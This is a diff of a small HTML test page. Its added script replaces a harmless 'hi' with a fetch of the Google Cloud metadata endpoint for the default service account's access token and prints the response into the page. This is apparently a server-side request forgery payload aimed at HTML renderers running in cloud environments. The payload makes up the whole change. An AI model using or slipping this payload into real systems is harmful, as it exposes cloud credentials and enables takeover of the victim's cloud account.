@@ -1,6 +1,11 @@
 <div id="test"></div>
 <script>
 
-document.getElementById("test").innerHTML = "hi";
+myDiv = document.getElementById("test");
+fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token").then(function(response) {
+    return response.text().then(function(text) {
+      myDiv.innerHTML = text;
+    });
+  });
 
 </script>
